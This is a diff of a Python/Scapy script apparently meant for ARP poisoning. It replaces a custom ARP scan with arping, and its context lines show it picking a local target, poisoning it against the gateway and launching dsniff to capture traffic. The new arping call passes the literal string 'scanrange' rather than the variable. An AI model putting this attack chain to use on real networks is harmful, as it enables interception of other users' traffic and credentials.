@@ -81,10 +81,10 @@ def makerange(gwaddr):
     return iprange
 
 # ARP scanner function goes here that gets list of possible targets...
-def arpscan(scanrange):
-    ans,unans=srp(Ether()/ARP(pdst=scanrange),timeout=0.5,inter=0.1)
-    for snd,rcv in ans:
-        print rcv.sprintf("%Ether.src% & %ARP.psrc%")
+#def arpscan(scanrange):
+#    ans,unans=srp(Ether()/ARP(pdst=scanrange),timeout=0.5,inter=0.1)
+#    for snd,rcv in ans:
+#        print rcv.sprintf("%Ether.src% & %ARP.psrc%")
 
 # Faster ARP scanner, currently disabled as it is "crashy".
 #def arpscan(scanrange):
@@ -185,7 +185,8 @@ gwaddr = get_default_gateway_linux()
 print("[*] Gateway address: " + gwaddr)
 scanrange = makerange(gwaddr)
 print("[+] Range to scan is: " + scanrange)
-arpscan(scanrange)
+arping("scanrange") # should be a far faster scanner. If it breaks just uncomment the one above :)
+#arpscan(scanrange)
 target = raw_input("Please Select a Target: ")
 arppoison(iface, target, gwaddr)
 launch_dsniff(iface)
